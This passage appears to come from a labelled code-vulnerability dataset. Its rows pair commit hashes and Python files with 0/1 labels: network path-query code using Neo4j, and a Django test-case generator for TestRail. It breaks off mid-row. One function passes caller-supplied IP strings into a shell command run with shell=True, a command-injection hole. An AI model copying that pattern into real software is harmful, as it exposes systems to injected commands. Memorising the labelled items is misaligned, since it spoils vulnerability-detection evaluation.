        if re.search(r'^\d+\.\d+\.\d+\.\d+$', src):
            srct = nglib.query.net.get_net(src, rtype=""NGTREE"")

        if re.search(r'^\d+\.\d+\.\d+\.\d+$', dst):
            dstt = nglib.query.net.get_net(dst, rtype=""NGTREE"")
        
        # Intra VRF
        if srct['_child001']['VRF'] == dstt['_child001']['VRF']:
            ngtree = get_routed_path(src, dst, verbose=False)                 
        
        # Inter VRF
        else:
            secpath = get_fw_path(src, dst, rtype=""NGTREE"")
            ngtree = nglib.ngtree.get_ngtree(secpath['Name'], tree_type=""L4-PATH"")

            # Filter security path for relavent nodes
            first = True
            last = None
            for key in sorted(secpath.keys()):
                if '_child' in key:
                    if re.search(r'(Network|FW)', secpath[key]['Name']):

                        # First Entry gets a route check
                        if first:
                            rtree = get_routed_path(src, secpath[key]['gateway'], \
                                vrf=srct['_child001']['VRF'], l2path=l2path)
                            if rtree:
                                nglib.ngtree.add_child_ngtree(ngtree, rtree)
                            first = False
                        nglib.ngtree.add_child_ngtree(ngtree, secpath[key])
                        last = key

            # Last entry gets a route check
            if last:
                rtree = get_routed_path(secpath[last]['gateway'], dst, \
                    vrf=dstt['_child001']['VRF'], l2path=l2path)
                if rtree:
                    nglib.ngtree.add_child_ngtree(ngtree, rtree)
        
        return ngtree

def get_switched_path(switch1, switch2, rtype=""NGTREE"", verbose=True):
    """"""
    Find the path between two switches and return all interfaces and
    devices between the two.

    - Uses Neo4j All Shortest Paths on NEI Relationships
    - Returns all distinct links along shortest paths along with distance

    Notes: Query finds all shortest paths between two Switch nodes. Then finds
    all links between individual nodes and gets both switch and port names. Data
    is sorted by distance then switch name.
    """"""

    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        logger.info(""Query: Finding Switched Paths (%s --> %s) for %s"",
                    switch1, switch2, nglib.user)

        pathList = []
        ngtree = nglib.ngtree.get_ngtree(""Switched Paths"", tree_type=""L2-PATH"")
        ngtree[""Name""] = switch1 + "" -> "" + switch2

        dist = dict()

        swp = nglib.py2neo_ses.cypher.execute(
            'MATCH (ss:Switch), (ds:Switch), '
            + 'sp = allShortestPaths((ss)-[:NEI*0..9]-(ds)) '
            + 'WHERE ss.name =~ {switch1} AND ds.name =~ {switch2}'
            + 'UNWIND nodes(sp) as s1 UNWIND nodes(sp) as s2 '
            + 'MATCH (s1)<-[nei:NEI]-(s2), plen = shortestPath((ss)-[:NEI*0..9]-(s1)) '
            + 'RETURN DISTINCT s1.name AS csw, s2.name AS psw, '
            + 'nei.pPort AS pport, nei.cPort as cport, nei.native AS native, '
            + 'nei.cPc as cPc, nei.pPc AS pPc, nei.vlans AS vlans, nei.rvlans as rvlans, '
            + 'nei._rvlans AS p_rvlans, '
            + 'LENGTH(plen) as distance ORDER BY distance, s1.name, s2.name',
            {""switch1"": switch1, ""switch2"": switch2})



        last = 0
        for rec in swp:
            swptree = nglib.ngtree.get_ngtree(""Link"", tree_type=""L2-HOP"")

            # Fix distance from directed graph
            if rec.distance == 0:
                swptree['distance'] = rec.distance + 1
                last = 1
            elif last:
                if rec.distance == last:
                    last += 1
                    swptree['distance'] = rec.distance + 1
                elif rec.distance == (last-1):
                    swptree['distance'] = rec.distance + 1
                else:
                    swptree['distance'] = rec.distance
                    last = 0
            else:
                swptree['distance'] = rec.distance

            swptree['Name'] = '#' + str(swptree['distance']) + ' ' + \
            rec.psw + '(' + rec.pport +  ') <-> ' \
            + rec.csw + '(' + rec.cport + ')'
            nglib.ngtree.add_child_ngtree(ngtree, swptree)

            swptree['Child Switch'] = rec.csw
            swptree['Child Port'] = rec.cport
            swptree['Parent Switch'] = rec.psw
            swptree['Parent Port'] = rec.pport

            if rec.cPc:
                swptree['Child Channel'] = rec.cPc
                swptree['Parent Channel'] = rec.pPc
            if rec.rvlans:
                swptree['Link VLANs'] = rec.vlans
                swptree['Link rVLANs'] = rec.rvlans
                swptree['_rvlans'] = rec.p_rvlans
                swptree['Native VLAN'] = rec.native


            pathList.append(swptree)

        if pathList:

            ngtree['Links'] = len(pathList)
            ngtree['Distance'] = max([s['distance'] for s in pathList])

            # CSV Prints locally for now
            if rtype == ""CSV"":
                nglib.query.print_dict_csv(pathList)

            # Export NG Trees
            else:
                # Export NGTree
                ngtree = nglib.query.exp_ngtree(ngtree, rtype)
                return ngtree
        elif verbose:
            print(""No results found for path between {:} and {:}"".format(switch1, switch2))

    return


def get_routed_path(net1, net2, rtype=""NGTREE"", vrf=""default"", verbose=True, l2path=True):
    """"""
    Find the routed path between two CIDRs and return all interfaces and
    devices between the two. This query need optimization.

    - net1 and net2 can be IPs, and it will find the CIDR
    - Uses Neo4j All Shortest Paths on ROUTED Relationships
    - Returns all distinct links along shortest paths along with distance

    """"""

    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        logger.info(""Query: Finding Routed Paths (%s --> %s) for %s"",
                    net1, net2, nglib.user)


        # Translate IPs to CIDRs
        if re.search(r'^\d+\.\d+\.\d+\.\d+$', net1):
            n1tree = nglib.query.net.get_net(net1, rtype=""NGTREE"")
            net1 = n1tree['_child001']['Name']

        if re.search(r'^\d+\.\d+\.\d+\.\d+$', net2):
            n2tree = nglib.query.net.get_net(net2, rtype=""NGTREE"")
            if n2tree:
                net2 = n2tree['_child001']['Name']


        
        ngtree = nglib.ngtree.get_ngtree(""Path"", tree_type=""L3-PATH"")
        ngtree[""Path""] = net1 + "" -> "" + net2
        ngtree['Name'] = ngtree['Path']

        pathList = []
        pathRec = []

        # Finds all paths, then finds the relationships
        rtrp = nglib.py2neo_ses.cypher.execute(
            'MATCH (sn:Network), (dn:Network), rp = allShortestPaths '
            + '((sn)-[:ROUTED|ROUTED_BY|ROUTED_STANDBY*0..12]-(dn)) '
            + 'WHERE ALL(v IN rels(rp) WHERE v.vrf = {vrf}) '
            + 'AND sn.cidr =~ {net1} AND dn.cidr =~ {net2}'
            + 'UNWIND nodes(rp) as r1 UNWIND nodes(rp) as r2 '
            + 'MATCH (r1)<-[l1:ROUTED]-(n:Network {vrf:{vrf}})-[l2:ROUTED]->(r2) '
            + 'OPTIONAL MATCH (n)-[:L3toL2]->(v:VLAN) '
            + 'RETURN DISTINCT r1.name AS r1name, l1.gateway AS r1ip, '
            + 'r2.name AS r2name, l2.gateway as r2ip, v.vid AS vid, '
            + 'LENGTH(shortestPath((sn)<-[:ROUTED|ROUTED_BY|ROUTED_STANDBY*0..12]->(r1))) '
            + 'AS distance ORDER BY distance',
            {""net1"": net1, ""net2"": net2, ""vrf"": vrf})


        allpaths = dict()
        # Load all paths into tuples with distance value
        for rec in rtrp:
            p = (rec[""r1name""], rec[""r2name""])
            allpaths[p] = rec[""distance""]


        # Find tuple with shortest distance (r1, core1) vs (core1, r1)
        # Save to pathRec for second pass of records to populate tree
        for en in allpaths:
            if allpaths[en] < allpaths[tuple(reversed(en))]:
                (r1, r2) = en
                distance = allpaths[en]
                pathRec.append((r1, r2, distance))

        # Sort path records by distance, src router, dst router
        pathRec = sorted(pathRec, key=lambda tup: (tup[2], tup[0], tup[1]))

        # Build Trees and pathList from pathRecs
        for path in pathRec:
            for rec in rtrp:
                if path[0] == rec['r1name'] and path[1] == rec['r2name']:
                    #print(path[0], rec['r1ip'], '-->', path[1], rec['r2ip'])
                    rtree = nglib.ngtree.get_ngtree(""Hop"", tree_type=""L3-HOP"")
                    rtree['From Router'] = rec['r1name']
                    rtree['From IP'] = rec['r1ip']
                    rtree['To Router'] = rec['r2name']
                    rtree['To IP'] = rec['r2ip']
                    rtree['VLAN'] = rec['vid']

                    # Calculate hop distance
                    # Distance of 1 is correct, other distances should be:
                    #   ((dist - 1) / 2) + 1
                    distance = rec['distance']
                    if distance != 1:
                        distance = int((distance - 1) / 2) + 1

                    # Save distance
                    rtree['distance'] = distance

                    # Rename rtree
                    rtree['Name'] = ""#{:} {:}({:}) -> {:}({:})"".format( \
                    distance, rec['r1name'], rec['r1ip'], rec['r2name'], rec['r2ip'])

                    # Add Switchpath if requested
                    if l2path:
                        spath = get_switched_path(rec['r1name'], rec['r2name'], verbose=False)
                        for sp in spath:
                            if '_child' in sp and '_rvlans' in spath[sp]:
                                vrgx = r'[^0-9]*' + rec['vid'] + '[^0-9]*'
                                if re.search(vrgx, spath[sp]['_rvlans']):
                                    nglib.ngtree.add_child_ngtree(rtree, spath[sp])
                                # else:
                                #     print(spath[sp]['_rvlans'])
                                # nglib.ngtree.add_child_ngtree(rtree, spath[sp])

                    nglib.ngtree.add_child_ngtree(ngtree, rtree)
                    pathList.append(rtree)

        # Check Results
        if pathList:

            ngtree['Hops'] = len(pathList)
            ngtree['Max Hops'] = max([s['distance'] for s in pathList])
            ngtree['VRF'] = vrf


            # CSV Prints locally for now
            if rtype == ""CSV"":
                nglib.query.print_dict_csv(pathList)

            # Export NG Trees
            else:
                # Export NGTree
                ngtree = nglib.query.exp_ngtree(ngtree, rtype)
                return ngtree
        elif verbose:
            print(""No results found for path between {:} and {:}"".format(net1, net2), file=sys.stderr)

    return

def get_fw_path(src, dst, rtype=""TEXT"", verbose=True):
    """"""Discover the Firewall Path between two IP addresses""""""

    rtypes = ('TEXT', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        logcmd = nglib.config['nglib']['logcmd']
        logurl = nglib.config['nglib']['logurl']

        srcnet = nglib.query.net.find_cidr(src)
        dstnet = nglib.query.net.find_cidr(dst)

        logger.info(""Query: Security Path %s -> %s for %s"", src, dst, nglib.user)

        if nglib.verbose:
            print(""\nFinding security path from {:} -> {:}:\n"".format(srcnet, dstnet))

        # Shortest path between VRFs
        path = nglib.py2neo_ses.cypher.execute(
            'MATCH (s:Network { cidr:{src} })-[e1:VRF_IN]->(sv:VRF), '
            + '(d:Network {cidr:{dst}})-[e2:VRF_IN]->(dv:VRF), '
            + 'p = shortestPath((sv)-[:VRF_IN|ROUTED_FW|:SWITCHED_FW*0..20]-(dv)) RETURN s,d,p',
            src=srcnet, dst=dstnet)

        fwsearch = dict()

        ngtree = nglib.ngtree.get_ngtree(""Security Path"", tree_type=""L4-PATH"")

        # Go through all nodes in the path
        if len(path) > 0:
            for r in path.records:
                sn = r.s
                snp = nglib.query.nNode.getJSONProperties(sn)
                dn = r.d
                dnp = nglib.query.nNode.getJSONProperties(dn)

                startpath = snp['cidr'] + "" -> ""
                path = """"

                # Path
                nodes = r.p.nodes
                for node in nodes:
                    nProp = nglib.query.nNode.getJSONProperties(node)
                    label = nglib.query.nNode.getLabel(node)
                    tlabel = re.search(r'(\w+)', label)
                    hop = nglib.ngtree.get_ngtree(tlabel.group(1), tree_type=""L4-HOP"")
                    if re.search('VRF', label):
                        path = path + ""VRF:"" + nProp['name'] + "" -> ""

                    if re.search('FW', label):
                        path = path + nProp['name'] + "" -> ""
                        fwsearch[nProp['name']] = nProp['hostname'] + "","" + nProp['logIndex']
                        hop['Name'] = ""FW""
                                        
                    for prop in nProp:
                        hop[prop] = nProp[prop]
                    nglib.ngtree.add_child_ngtree(ngtree, hop)

                # Save the Path
                ngtree['Name'] = re.search(r'(.*)\s->\s$', path).group(1)
                path = snp['cidr'] + "" -> "" + path + dnp['cidr']

                # Text output for standalone query
                if rtype == ""TEXT"":
                    print(""\nSecurity Path: "" + path)

                    for fw in fwsearch.keys():
                        (hostname, logIndex) = fwsearch[fw].split(',')

                        # Splunk Specific Log Search, may need site specific adjustment
                        cmd = ""{:} 'index={:} host::{:} {:} {:}'"".format(
                            logcmd, logIndex, hostname, src, dst)
                        query = 'index={:} host::{:} {:} {:}'.format(
                            logIndex, hostname, src, dst)

                        query = query.replace("" "", ""%20"")

                        print(""\n{:} (15min): {:}{:}"".format(fw, logurl, query))

                        if verbose:
                            print(cmd)

                        proc = subprocess.Popen(
                            [cmd + "" 2> /dev/null""],
                            stdout=subprocess.PIPE,
                            shell=True,
                            universal_newlines=True)

                        (out, err) = proc.communicate()

                        if err:
                            print(err)
                        elif out:
                            print(out)

                # Space out
                print()

            # Export NGTree
            ngtree = nglib.query.exp_ngtree(ngtree, rtype)
            return ngtree

/n/n/n",1
188,fdf9014d36545a173667bec0b700a8b45609dd6f,"mdta/apps/testcases/utils.py/n/nfrom testrail import APIClient
from mdta.apps.graphs.models import Node, Edge
from mdta.apps.projects.models import Project, TestRailConfiguration

START_NODE_NAME = 'Start'


def context_testcases():
    """"""
    Retrieve context for tab TestCases
    :return:
    """"""
    context = {
        'projects': Project.objects.all(),
        'testrails': TestRailConfiguration.objects.all(),
    }

    return context


def get_projects_from_testrail(instance):
    client = APIClient(instance.host)
    client.user = instance.username
    client.password = instance.password

    return client.send_get('get_projects')


def create_routing_test_suite(project=None, modules=None):
    """"""
    Create routing paths for project.modules lists or module lists
    :param project:
    :param modules:
    :return:
    """"""
    data = []

    if project:
        data = create_routing_test_suite_module(project.modules)
    elif modules:
        data = create_routing_test_suite_module(modules)

    return data


def create_routing_test_suite_module(modules):
    """"""
    Create routing paths for list of modules
    :param modules:
    :return:
    """"""
    test_suites = []

    for module in modules:
        data = get_paths_through_all_edges(module.edges_all)

        test_suites.append({
            'module': module.name,
            'data': data
        })

    return test_suites


def get_paths_through_all_edges(edges):
    """"""
    Get all paths through all edges
    :param edges:
    :return:
    """"""
    data = []
    for edge in edges:
        # print(edge.id)
        path = routing_path_to_edge(edge)
        if path:
            tcs = []
            pre_condition = []
            # for index, step in enumerate(path, start=1):
            if isinstance(path[0], Node) and path[0].type.name == START_NODE_NAME:
                for step in path:
                    if isinstance(step, Node):
                        traverse_node(step, tcs)
                    if isinstance(step, Edge):
                        if step.type.name == 'PreCondition':
                            update_testcase_precondition(step, pre_condition)
                        traverse_edge(step, tcs)

                data.append({
                    'pre_condition': pre_condition,
                    'tc_steps': tcs
                })
    # return check_subpath_in_all(data)
    return data


def routing_path_to_edge(edge):
    """"""
    Routing path to current Edge, edge.from_node
    :param edge:
    :return:
    """"""
    visited_nodes = [edge.to_node]  # Visited nodes for the path to this Edge

    data = []

    routing_path_to_node(edge.from_node, data, visited_nodes)

    if data:
        data.append(edge)
        data.append(edge.to_node)

    # print(data)
    return data


def routing_path_to_node(node, data, visited_nodes):
    """"""
    Routing path to current Node
    :param node:
    :param data:
    :return:
    """"""
    path = []
    visited_nodes.append(node)

    breadth_first_search(node, path, visited_nodes)

    data += path


def breadth_first_search(node, path, visited_nodes):
    """"""
    Search a path from Start node(type='Start') to current Node
    Breadth
    :param node:
    :return:
    """"""

    start_node_found_outside = False  # flag to find Start Node outside

    if node.type.name == START_NODE_NAME:
        path.append(node)
    else:
        # edges = Edge.objects.filter(to_node=node)
        edges = node.arriving_edges
        if edges.count() > 0:
            start_node_found = False  # flag to find Start Node in current search
            for edge in edges:
                if edge.from_node not in visited_nodes or edge.from_node.type.name == START_NODE_NAME:  # if Node is not visited or Node is Start
                    if edge.from_node != edge.to_node:
                        if edge.from_node.type.name != START_NODE_NAME:
                            if edge.from_node.arriving_edges.count() > 0:
                                start_node_found_outside = True
                                breadth_first_search(edge.from_node, path, visited_nodes)
                        else:
                            start_node_found = True
                            path.append(edge.from_node)

                        if start_node_found or start_node_found_outside:  # if found Start Node, add Edge
                            path.append(edge)
                            path.append(node)

                    if start_node_found:  # if found Start Node, break out of for loop
                        break
            if not start_node_found:  # if Not found Start Node, variable Path=[]
                path = []
        else:  # if No Arriving Edges, variable Path=[]
            path = []

    if start_node_found_outside:
        path.append(node)

    # print('path: ', node.name,  path)


def check_subpath_in_all(all_path):
    """"""
    Find sub paths contained by parent path in all possible paths and remove them
    Use set(a) < set(b) to compare if list_b contains list_a
    :param all_path:
    :return:
    """"""
    data = []
    length = len(all_path)
    for i in range(length):
        for j in range(i + 1, length):
            if set(all_path[i]) < set(all_path[j]) and not check_path_contains_in_result(all_path[j], data):
                data.append(all_path[j])
            elif set(all_path[i]) > set(all_path[j]) and not check_path_contains_in_result(all_path[i], data):
                data.append(all_path[i])

    # check if first path of all_path is in result
    if length > 0 and not check_path_contains_in_result(all_path[0], data):
        data.append(all_path[0])

    return data


def check_path_contains_in_result(path, result):
    """"""
    Check current path is covered in result
    :param path:
    :param result:
    :return:
    """"""
    flag = False
    for i in range(len(result)):
        if set(path) <= set(result[i]):
            flag = True
            break
        else:
            continue

    return flag


def traverse_node(node, tcs):
    """"""
    Traverse Node based on node type
    :param node:
    :param tcs:
    :return:
    """"""
    if node.type.name == START_NODE_NAME:
        add_step(node_start(node), tcs)
    elif node.type.name in ['Menu Prompt', 'Menu Prompt with Confirmation', 'Play Prompt']:
        add_step(node_prompt(node), tcs)
    else:
        add_step(node_check_holly_log(node), tcs)


def node_start(node):
    return {
        'content': get_item_properties(node),
    }


def node_prompt(node):
    return {
        'content': 'Node - ' + node.name,
        'expected': node.properties['Verbiage']
    }


def node_check_holly_log(node):
    return {
        'content': 'Node - ' + node.name
    }


def traverse_edge(edge, tcs):
    """"""
    Traverse Edge based on edge type
    :param edge:
    :param tcs:
    :return:
    """"""
    if edge.type.name == 'DTMF':
        add_step(edge_dtmf_dial(edge), tcs)
    elif edge.type.name == 'Speech':
        add_step(edge_speech_say(edge), tcs)
    elif edge.type.name == 'Data':
        add_step(edge_alter_data_requirement(edge), tcs)
    elif edge.type.name == 'PreCondition':
        add_step(edge_precondition(edge), tcs)


def add_step(step, tcs):
    """"""
    Add step to test cases
    :param step:
    :param tcs:
    :return:
    """"""
    tcs.append({
        'content': step['content'],
        'expected': step['expected'] if 'expected' in step.keys() else ''
    })


def edge_dtmf_dial(edge):
    return {
        'content': 'DTMF Dial - ' + get_item_properties(edge)
    }


def edge_speech_say(edge):
    return {
        'content': 'Speech Say - ' + get_item_properties(edge)
    }


def edge_alter_data_requirement(edge):
    return {
        'content': 'Alter Data Requirement - ' + get_item_properties(edge)
    }


def edge_precondition(edge):
    return {
        'content': 'PreCondition - ' + get_item_properties(edge)
    }


def get_item_properties(item):
    data = ''
    for key in item.properties:
        data += key + ': ' + item.properties[key] + ', '

    return data


def update_testcase_precondition(edge, pre_condition):
    data = []
    for key in edge.properties:
        data.append(key + ': ' + edge.properties[key])

    pre_condition.append(data)



/n/n/n",0
189,fdf9014d36545a173667bec0b700a8b45609dd6f,"/mdta/apps/testcases/utils.py/n/nfrom testrail import APIClient
from mdta.apps.graphs.models import Node, Edge
from mdta.apps.projects.models import Project, TestRailConfiguration

START_NODE_NAME = 'Start'


def context_testcases():
    """"""
    Retrieve context for tab TestCases
    :return:
    """"""
    context = {
        'projects': Project.objects.all(),
        'testrails': TestRailConfiguration.objects.all(),
    }

    return context


def get_projects_from_testrail(instance):
    client = APIClient(instance.host)
    client.user = instance.username
    client.password = instance.password

    return client.send_get('get_projects')


def create_routing_test_suite(project=None, modules=None):
    """"""
    Create routing paths for project.modules lists or module lists
    :param project:
    :param modules:
    :return:
    """"""
    data = []

    if project:
        data = create_routing_test_suite_module(project.modules)
    elif modules:
        data = create_routing_test_suite_module(modules)

    return data


def create_routing_test_suite_module(modules):
    """"""
    Create routing paths for list of modules
    :param modules:
    :return:
    """"""
    test_suites = []

    for module in modules:
        data = get_paths_through_all_edges(module.edges_all)

        test_suites.append({
            'module': module.name,
            'data': data
        })

    return test_suites


def get_paths_through_all_edges(edges):
    """"""
    Get all paths through all edges
    :param edges:
    :param data:
    :return:
    """"""
    data = []
    for edge in edges:
        # print(edge.id)
        path = routing_path_to_edge(edge)
        if path:
            tcs = []
            pre_condition = []
            # for index, step in enumerate(path, start=1):
            for step in path:
                if isinstance(step, Node):
                    traverse_node(step, tcs)
                if isinstance(step, Edge):
                    if step.type.name == 'PreCondition':
                        update_testcase_precondition(step, pre_condition)
                    traverse_edge(step, tcs)

            data.append({
                'pre_condition': pre_condition,
                'tc_steps': tcs
            })
    # return check_subpath_in_all(data)
    return data


def routing_path_to_edge(edge):
    """"""
    Routing path to current Edge, edge.from_node
    :param edge:
    :return:
    """"""
    visited_nodes = [edge.to_node]  # Visited nodes for the path to this Edge

    data = []

    routing_path_to_node(edge.from_node, data, visited_nodes)

    if data:
        data.append(edge)
        data.append(edge.to_node)

    # print(data)
    return data


def routing_path_to_node(node, data, visited_nodes):
    """"""
    Routing path to current Node
    :param node:
    :param data:
    :return:
    """"""
    path = []
    visited_nodes.append(node)

    breadth_first_search(node, path, visited_nodes)

    data += path


def breadth_first_search(node, path, visited_nodes):
    """"""
    Search a path from Start node(type='Start') to current Node
    Breadth
    :param node:
    :return:
    """"""

    start_node_found_outside = False  # flag to find Start Node outside

    if node.type.name == START_NODE_NAME:
        path.append(node)
    else:
        # edges = Edge.objects.filter(to_node=node)
        edges = node.arriving_edges
        if edges.count() > 0:
            start_node_found = False  # flag to find Start Node in current search
            for edge in edges:
                if edge.from_node not in visited_nodes or edge.from_node.type.name == START_NODE_NAME:  # if Node is not visited or Node is Start
                    if edge.from_node != edge.to_node:
                        if edge.from_node.type.name != START_NODE_NAME:
                            if edge.from_node.arriving_edges.count() > 0:
                                start_node_found_outside = search_start_node_outside(edge.from_node)
                                breadth_first_search(edge.from_node, path, visited_nodes)
                        else:
                            start_node_found = True
                            path.append(edge.from_node)

                        if start_node_found or start_node_found_outside:  # if found Start Node, add Edge
                            path.append(edge)
                            path.append(node)

                    if start_node_found:  # if found Start Node, break out of for loop
                        break
            if not start_node_found:  # if Not found Start Node, variable Path=[]
                path = []
        else:  # if No Arriving Edges, variable Path=[]
            path = []

    if start_node_found_outside:
        path.append(node)

    # print('path: ', node.name,  path)


def check_subpath_in_all(all_path):
    """"""
    Find sub paths contained by parent path in all possible paths and remove them
    Use set(a) < set(b) to compare if list_b contains list_a
    :param all_path:
    :return:
    """"""
    data = []
    length = len(all_path)
    for i in range(length):
        for j in range(i + 1, length):
            if set(all_path[i]) < set(all_path[j]) and not check_path_contains_in_result(all_path[j], data):
                data.append(all_path[j])
            elif set(all_path[i]) > set(all_path[j]) and not check_path_contains_in_result(all_path[i], data):
                data.append(all_path[i])

    # check if first path of all_path is in result
    if length > 0 and not check_path_contains_in_result(all_path[0], data):
        data.append(all_path[0])

    return data


def check_path_contains_in_result(path, result):
    """"""
    Check current path is covered in result
    :param path:
    :param result:
    :return:
    """"""
    flag = False
    for i in range(len(result)):
        if set(path) <= set(result[i]):
            flag = True
            break
        else:
            continue

    return flag


def traverse_node(node, tcs):
    """"""
    Traverse Node based on node type
    :param step:
    :param tcs:
    :return:
    """"""
    if node.type.name == START_NODE_NAME:
        add_step(node_start(node), tcs)
    elif node.type.name in ['Menu Prompt', 'Menu Prompt with Confirmation', 'Play Prompt']:
        add_step(node_prompt(node), tcs)
    else:
        add_step(node_check_holly_log(node), tcs)


def node_start(node):
    return {
        'content': get_item_properties(node),
    }


def node_prompt(node):
    return {
        'content': 'Node - ' + node.name,
        'expected': node.properties['Verbiage']
    }


def node_check_holly_log(node):
    return {
        'content': 'Node - ' + node.name
    }


def traverse_edge(edge, tcs):
    """"""
    Traverse Edge based on edge type
    :param edge:
    :param tcs:
    :return:
    """"""
    if edge.type.name == 'DTMF':
        add_step(edge_dtmf_dial(edge), tcs)
    elif edge.type.name == 'Speech':
        add_step(edge_speech_say(edge), tcs)
    elif edge.type.name == 'Data':
        add_step(edge_alter_data_requirement(edge), tcs)
    elif edge.type.name == 'PreCondition':
        add_step(edge_precondition(edge), tcs)


def add_step(step, tcs):
    """"""
    Add step to test cases
    :param step:
    :param tcs:
    :return:
    """"""
    tcs.append({
        'content': step['content'],
        'expected': step['expected'] if 'expected' in step.keys() else ''
    })


def edge_dtmf_dial(edge):
    return {
        'content': 'DTMF Dial - ' + get_item_properties(edge)
    }


def edge_speech_say(edge):
    return {
        'content': 'Speech Say - ' + get_item_properties(edge)
    }


def edge_alter_data_requirement(edge):
    return {
        'content': 'Alter Data Requirement - ' + get_item_properties(edge)
    }


def edge_precondition(edge):
    return {
        'content': 'PreCondition - ' + get_item_properties(edge)
    }


def get_item_properties(item):
    data = ''
    for key in item.properties:
        data += key + ': ' + item.properties[key] + ', '

    return data


def update_testcase_precondition(edge, pre_condition):
    data = []
    for key in edge.properties:
        data.append(key + ': ' + edge.properties[key])

    pre_condition.append(data)


def search_start_node_outside(node):
    flag = False
    if node.arriving_edges.count() > 0:
        for edge in node.arriving_edges:
            if edge.from_node.type.name == START_NODE_NAME:
                flag = True
                break

    return flag

/n/n/n",1
190,0772b3cac8c1dffd0c611a30e56c69f106a92ae2,"mdta/apps/testcases/tasks.py/n/nfrom datetime import datetime
from django.core.exceptions import ValidationError
from django.shortcuts import get_object_or_404

from mdta.celery_module import app
from mdta.apps.projects.models import Project
from mdta.apps.testcases.models import TestCaseResults
from mdta.apps.testcases.utils import create_routing_test_suite, add_testsuite_to_project, remove_section_from_testsuite, \
    add_section_to_testsuite, add_testcase_to_section
from mdta.apps.testcases.testrail import APIClient


@app.task
def create_testcases_celery(project_id):
    """"""
    Create TestCases per project/module
    :param request:
    :param project_id:
    :return:
    """"""

    project = get_object_or_404(Project, pk=project_id)
    testcases = create_routing_test_suite(project=project)

    tc_results = TestCaseResults.objects.filter(project=project)
    if tc_results.count() > 2:
        tc_latest = project.testcaseresults_set.latest('updated')
        if tc_latest.results == testcases:
            tc_latest.updated = datetime.now()
            tc_latest.save()
        else:
            tc_earliest = project.testcaseresults_set.earliest('updated')
            tc_earliest.results = testcases
            tc_earliest.updated = datetime.now()
            tc_earliest.save()
    else:
        try:
            TestCaseResults.objects.create(
                project=project,
                results=testcases
            )
        except (ValueError, ValidationError) as e:
            print(str(e))

    msg = push_testcases_to_testrail_celery(project.id)

    return msg


@app.task
def push_testcases_to_testrail_celery(project_id):
    """"""
    Push Testcases of project to TestRail
    :param request:
    :param project_id:
    :return:
    """"""
    project = get_object_or_404(Project, pk=project_id)
    testrail_contents = ''

    try:
        client = APIClient(project.testrail.instance.host)
        client.user = project.testrail.instance.username
        client.password = project.testrail.instance.password

        testrail_contents = client.send_get('get_project/' + project.testrail.project_id)

        tr_suites = client.send_get('get_suites/' + project.testrail.project_id)
        testcases = project.testcaseresults_set.latest('updated').results

        # Find or Create TestSuites in TestRail
        try:
            tr_suite = (suite for suite in tr_suites if suite['name'] == project.version).__next__()
        except StopIteration as e:
            print('Suite: ', e)
            tr_suite = add_testsuite_to_project(client,
                                                project.testrail.project_id,
                                                project.version)
            if not tr_suite:
                raise PermissionError('You are not allowed (Insufficient Permissions)')

        tr_suite_sections = client.send_get('get_sections/' + project.testrail.project_id + '&suite_id=' + str(tr_suite['id']))
        # print(tr_suite_sections)

        # Find or Create Section of TestSuites
        for item in testcases:
            try:
                section = (section for section in tr_suite_sections if section['name'] == item['module']).__next__()
                remove_section_from_testsuite(client, str(section['id']))

                section_id = add_section_to_testsuite(client,
                                                      project.testrail.project_id,
                                                      tr_suite['id'],
                                                      item['module'])

                add_testcase_to_section(client, section_id, item['data'])

            except StopIteration as e:
                print('Section: ', e)
                section_id = add_section_to_testsuite(client,
                                                      project.testrail.project_id,
                                                      tr_suite['id'],
                                                      item['module'])
                add_testcase_to_section(client, section_id, item['data'])

    except AttributeError:
        testrail_contents = {
            'error': 'No TestRail config'
        }

    except (TestCaseResults.DoesNotExist, PermissionError) as e:
        testrail_contents = {
            'error': e
        }

    return testrail_contents

/n/n/nmdta/apps/testcases/utils.py/n/nimport collections
import time

from mdta.apps.graphs.models import Node, Edge
from mdta.apps.projects.models import Project, TestRailConfiguration
from mdta.apps.testcases.testrail import APIClient, APIError
from mdta.apps.testcases.utils_backwards_traverse import path_traverse_backwards
from mdta.apps.testcases.utils_negative_testcases import negative_testcase_generation, rejected_testcase_generation

from mdta.apps.testcases.constant_names import NODE_START_NAME, NODE_MP_NAME, LANGUAGE_DEFAULT_NAME


def context_testcases():
    """"""
    Retrieve context for tab TestCases
    :return:
    """"""
    context = {
        'projects': Project.objects.all(),
        'testrails': TestRailConfiguration.objects.all(),
    }

    return context


# --------------- Routing Project/Module Graph Start ---------------
def create_routing_test_suite(project=None, modules=None):
    """"""
    Create routing paths for project.modules lists or module lists
    :param project:
    :param modules:
    :return:
    """"""
    data = []
    shortest_set = []  # found shortest set from Start to node, key is 'Start + node', value is list of nodes

    if project:
        if project.language:
            language = project.language.name
        else:
            language = LANGUAGE_DEFAULT_NAME
        # start = time.time()
        data = create_routing_test_suite_module(project.modules, language, shortest_set)
        # print(project.name, time.time() - start)
    elif modules:
        if modules[0].project.language:
            language = modules[0].project.language.name
        else:
            language = LANGUAGE_DEFAULT_NAME
        data = create_routing_test_suite_module(modules, language, shortest_set)

    return data


def create_routing_test_suite_module(modules, language, shortest_set):
    """"""
    Create routing paths for list of modules
    :param modules:
    :return:
    """"""
    test_suites = []

    if len(modules) > 0 and modules[0].project.test_header:
        th_module = modules[0].project.test_header
    else:
        th_module = None

    for module in modules:
        # start_time = time.time()
        data = get_paths_through_all_edges(module.edges_all, th_module, language, shortest_set)

        test_suites.append({
            'module': module.name,
            'data': data
        })
        # print(module.name, time.time() - start_time, len(shortest_set))

    return test_suites


def get_paths_through_all_edges(edges, th_module=None, language=None, shortest_set=None):
    """"""
    Get all paths through all edges
    :param edges:
    :return:
    """"""
    th_paths = get_paths_from_test_header(th_module)
    # print(th_paths)

    data = []
    if th_paths:
        for th_path in th_paths:
            for edge in edges:
                # print(edge.id)
                path = routing_path_to_edge(edge, shortest_set)

                if path:
                    path_data = path_traverse_backwards(path, th_path=th_path, language=language)
                    if 'tcs_cannot_route' in path_data.keys():
                        data.append({
                            'tcs_cannot_route': path_data['tcs_cannot_route'],
                            'id': edge.id,
                            'title': 'Route from \'' +
                                     edge.from_node.name +
                                     '\' to \'' +
                                     edge.to_node.name + '\''
                        })
                    else:
                        title = 'Route from \'' + edge.from_node.name +\
                                    '\' to \'' + edge.to_node.name + '\''
                        # edge_id = edge.id,
                        data.append({
